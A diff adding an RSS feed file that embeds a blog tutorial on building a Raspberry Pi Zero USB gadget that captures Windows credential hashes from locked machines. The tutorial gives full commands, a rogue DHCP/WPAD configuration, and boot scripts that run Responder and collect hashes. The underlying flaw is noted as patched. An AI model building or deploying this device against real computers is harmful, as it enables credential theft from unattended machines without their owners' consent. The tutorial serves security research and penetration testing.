@@ -1,0 +1,252 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Raspberrypi on zone13.io</title>
+    <link>https://zone13.github.io/test-host/tags/raspberrypi/</link>
+    <description>Recent content in Raspberrypi on zone13.io</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 18 Sep 2016 12:13:05 +0100</lastBuildDate>
+    <atom:link href="https://zone13.github.io/test-host/tags/raspberrypi/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Raspberry Pi Zero for credential snagging</title>
+      <link>https://zone13.github.io/test-host/post/Raspberry-Pi-Zero-for-credential-snagging/</link>
+      <pubDate>Sun, 18 Sep 2016 12:13:05 +0100</pubDate>
+      
+      <guid>https://zone13.github.io/test-host/post/Raspberry-Pi-Zero-for-credential-snagging/</guid>
+      <description>
+
+&lt;blockquote&gt;
+&lt;p&gt;Update: &lt;strong&gt;CVE-2016-3302&lt;/strong&gt; / &lt;strong&gt;MS16-112&lt;/strong&gt; patch was released by Microsoft to fix the issue.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;This post is an extension to Rob Fuller&amp;rsquo;s (@mubix) work - &lt;a href=&#34;https://room362.com/post/2016/snagging-creds-from-locked-machines/&#34;&gt;https://room362.com/post/2016/snagging-creds-from-locked-machines/&lt;/a&gt; to see how a Raspberry Pi Zero can be used for credential snagging. All credits go to @mubix for the original research. It is recommended to read mubix&amp;rsquo;s post (if you haven&amp;rsquo;t already !) before proceeding.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://zone13.github.io/test-host/images/pizero.jpeg&#34; alt=&#34;Pi Zero 1.3&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h3&gt;
+
+&lt;h4 id=&#34;software&#34;&gt;Software&lt;/h4&gt;
+
+&lt;p&gt;This will &lt;strong&gt;only&lt;/strong&gt; work if the target Windows system has &lt;a href=&#34;https://en.wikipedia.org/wiki/RNDIS&#34;&gt;RNDIS&lt;/a&gt; drivers installed. The driver doesn&amp;rsquo;t seem to install automatically (like when you plug in a new mouse or any USB accessory) and has to be installed manually as explained &lt;a href=&#34;https://github.com/ev3dev/ev3dev/wiki/Setting-Up-Windows-USB-Ethernet-Networking&#34;&gt;here&lt;/a&gt; after booting up the Pi Zero for the first time.&lt;/p&gt;
+
+&lt;h4 id=&#34;hardware&#34;&gt;Hardware&lt;/h4&gt;
+
+&lt;p&gt;Raspberry Pi Zero (I have v1.3)&lt;/p&gt;
+
+&lt;p&gt;Micro SD card (4GB or more) with &lt;a href=&#34;https://www.raspberrypi.org/downloads/raspbian/&#34;&gt;Raspbian Jessie&lt;/a&gt; (I used Jessie Lite, Release date: 2016-05-27)&lt;/p&gt;
+
+&lt;p&gt;Micro USB cable (any cable that supports data transfer - try those coming with mobiles)&lt;/p&gt;
+
+&lt;h3 id=&#34;procedure&#34;&gt;Procedure&lt;/h3&gt;
+
+&lt;p&gt;I&amp;rsquo;m setting up the Pi Zero from my Windows machine (Windows 8.1). If you are working from a different OS, adopt any changes as necessary (Google is your best friend :)).&lt;/p&gt;
+
+&lt;p&gt;I assume that you have already installed the Raspbian Jessie Lite OS on the Micro SD card. On Windows, I prefer to use the &lt;a href=&#34;https://sourceforge.net/projects/win32diskimager/&#34;&gt;Win32DiskImager&lt;/a&gt;. If you are not familiar with the OS flashing process, refer &lt;a href=&#34;https://www.raspberrypi.org/documentation/installation/installing-images/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h4 id=&#34;pi-zero-usb-gadget-setup&#34;&gt;Pi Zero USB gadget setup&lt;/h4&gt;
+
+&lt;p&gt;Insert the Micro SD card with Raspbian OS into a suitable card reader and plug it into the Windows system. Open the boot partition in Windows explorer.&lt;/p&gt;
+
+&lt;p&gt;Two files need to be edited here:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;config.txt&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Append the following on a new line:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;   dtoverlay=dwc2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The resulting file looks like &lt;a href=&#34;https://github.com/zone13/pi-Zero-USB-Ethernet/blob/master/config.txt&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;cmdline.txt&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Insert the following after &lt;strong&gt;rootwait&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;   modules-load=dwc2,g_ether
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Be careful with the formatting on this one, the values are separated by spaces.&lt;/p&gt;
+
+&lt;p&gt;The resulting file looks like &lt;a href=&#34;https://github.com/zone13/pi-Zero-USB-Ethernet/blob/master/cmdline.txt&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Once both the files are edited and saved, eject the Micro SD card and insert into the Pi Zero slot. Connect the Pi Zero to the Windows system using the Micro USB cable.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Note: The cable has to be connected to the Micro USB port of Pi Zero to be used as a USB gadget.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;pi-zero-packages-setup&#34;&gt;Pi Zero packages setup&lt;/h4&gt;
+
+&lt;p&gt;If the Pi Zero is not detected by Windows system after booting up, it means that RNDIS drivers are not installed. The drivers can be installed by following the procedure &lt;a href=&#34;https://github.com/ev3dev/ev3dev/wiki/Setting-Up-Windows-USB-Ethernet-Networking&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Once the RNDIS devices are installed, the new USB Ethernet will be visible under &lt;strong&gt;Network Connections&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://zone13.github.io/test-host/images/net_conns_adapter.png&#34; alt=&#34;net_conns_adapter&#34; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Note: I have renamed my adapter as &lt;strong&gt;PiZero&lt;/strong&gt; and hence displayed above.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;There are a number of packages that need to be installed on the Pi Zero to be used a credential snagging device. For this to happen, the Pi Zero will need Internet access.&lt;/p&gt;
+
+&lt;p&gt;I decided to share my LAN Internet with Pi Zero for this purpose. You can do the same or even share your Wi-Fi Internet.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://zone13.github.io/test-host/images/share_internet.png&#34; alt=&#34;share_internet&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At this stage you should be able to ping Pi Zero (hostname: &lt;em&gt;raspberrypi.local&lt;/em&gt;)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://zone13.github.io/test-host/images/ping_pizero_local.png&#34; alt=&#34;ping_pizero_local&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, you can SSH to Pi Zero using the hostname.&lt;/p&gt;
+
+&lt;p&gt;The default credentials are:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;username: pi&lt;/p&gt;
+
+&lt;p&gt;password: raspberry&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://zone13.github.io/test-host/images/putty_settings.png&#34; alt=&#34;putty_settings&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At this point, it is a good idea to check Internet connectivity for the Pi Zero (e.g. try pinging google.com). If the ping can resolve to IP (not getting a ping response is alright), you are good to go. If there is some connectivity error, try running:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo dhclient usb0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, proceed with running the below commands in order:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo apt-get update
+sudo apt-get install -y python git python-pip python-dev screen sqlite3 isc-dhcp-server python-crypto inotify-tools
+
+sudo mkdir tools
+cd tools
+git clone https://github.com/spiderlabs/responder
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;configure-a-static-ip&#34;&gt;Configure a static IP&lt;/h4&gt;
+
+&lt;p&gt;Open /etc/network/interfaces&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /etc/network/interfaces
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Paste the below code at the end of the file:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;auto usb0
+allow-hotplug usb0
+iface usb0 inet static
+  address 192.168.2.201
+  netmask 255.255.255.0
+  gateway 192.168.2.1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://zone13.github.io/test-host/images/etc_interfaces.png&#34; alt=&#34;etc_interfaces&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;dhcp-server-setup&#34;&gt;DHCP server setup&lt;/h4&gt;
+
+&lt;p&gt;Backup the existing config file and create a new one for our setup&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bkp
+sudo nano /etc/dhcp/dhcpd.conf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Paste the below code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ddns-update-style none;
+
+option domain-name &amp;quot;domain.local&amp;quot;;
+option domain-name-servers 192.168.2.201;
+
+default-lease-time 60;
+max-lease-time 72;
+
+# If this DHCP server is the official DHCP server for the local
+# network, the authoritative directive should be uncommented.
+authoritative;
+
+# Use this to send dhcp log messages to a different log file (you also
+# have to hack syslog.conf to complete the redirection).
+log-facility local7;
+
+# wpad
+option local-proxy-config code 252 = text;
+
+# A slightly different configuration for an internal subnet.
+subnet 192.168.2.0 netmask 255.255.255.0 {
+  range 192.168.2.1 192.168.2.2;
+  option routers 192.168.2.201;
+  option local-proxy-config &amp;quot;http://192.168.2.201/wpad.dat&amp;quot;;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;run-scripts-at-boot&#34;&gt;Run scripts at boot&lt;/h4&gt;
+
+&lt;p&gt;Open the /etc/rc.local file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /etc/rc.local
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Paste the below code before &lt;strong&gt;exit 0&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Clear leases
+rm -f /var/lib/dhcp/dhcpd.leases
+touch /var/lib/dhcp/dhcpd.leases
+
+# Start DHCP server
+/usr/sbin/dhcpd
+
+# Start Responder
+/usr/bin/screen -dmS responder bash -c &#39;cd /home/pi/tools/responder/; python Responder.py -I usb0 -f -w -r -d -F&#39;
+
+# Monitor Responder.db and shutdown once the hashes are captured
+echo &amp;quot;Staring cred watch&amp;quot; &amp;gt;&amp;gt; /root/rc.log
+/usr/bin/screen -dmS notify bash -c &#39;while inotifywait -e modify /home/pi/tools/responder/Responder.db; do shutdown -h now; done&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;create-logs-for-screen-sessions&#34;&gt;Create logs for screen sessions&lt;/h4&gt;
+
+&lt;p&gt;Create a &lt;strong&gt;logs&lt;/strong&gt; folder:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo mkdir /root/logs
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Add a .screenrc file&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /root/.screenrc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Paste the below code in .screenrc file:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Logging
+deflog on
+logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That concludes the setup.&lt;/p&gt;
+
+&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;Try plugging in the Pi Zero to a locked Windows PC and wait. If all goes well, the Responder.db file will be created at &lt;strong&gt;/home/pi/tools/responder/&lt;/strong&gt; and hashes will be stored.&lt;/p&gt;
+
+&lt;p&gt;The captured hashes can be viewed using &lt;strong&gt;sqlite3&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sqlite3 /home/pi/tools/responder/Responder.db
+
+select * from responder;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://zone13.github.io/test-host/images/sqlite3_out.png&#34; alt=&#34;sqlite3_out&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
